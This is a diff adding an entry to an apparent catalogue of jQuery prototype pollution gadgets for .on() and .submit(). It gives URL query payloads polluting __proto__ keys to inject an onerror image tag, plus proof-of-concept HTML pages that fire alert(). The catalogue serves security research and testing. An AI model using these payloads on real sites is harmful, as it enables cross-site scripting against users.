@@ -155,3 +155,47 @@ return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.j
 $('#test').attr({"width":"100%"}) // The {} is being polluted with extra attributes
 </script>
 ```
+
+#### <span>$</span>(x).on, <span>$</span>(x).submit jQuery >= 1.9.0
+
+* Requires user interaction
+* Can be exploited through Function.prototype
+
+```
+?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror%3Dalert(1)>&__proto__[focus]=x&__proto__[needsContext]=x
+```
+
+```html
+<script src=https://code.jquery.com/jquery-3.7.1.js></script>
+<form id="search">
+  <input id="y" />
+</form>
+<script>
+Object.prototype.handler = ["x"];
+Object.prototype.selector = ["<img/src/onerror=alert(1)>"];
+Object.prototype.delegateType = "focus";
+Object.prototype.needsContext = "x";
+</script>
+<script>
+$("#search").submit(() => {});
+</script>
+```
+
+```
+?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror%3Dalert(1)>&__proto__[needsContext]=x
+```
+
+```html
+<script src=https://code.jquery.com/jquery-1.9.0.js></script>
+<div id="search">
+  <div>Test</div>
+</div>
+<script>
+Function.prototype.handler = ["x"];
+Function.prototype.selector = ["<img/src/onerror=alert(123)>"];
+Function.prototype.needsContext = "x";
+</script>
+<script>
+$("#search").on("click", () => {});
+</script>
+```
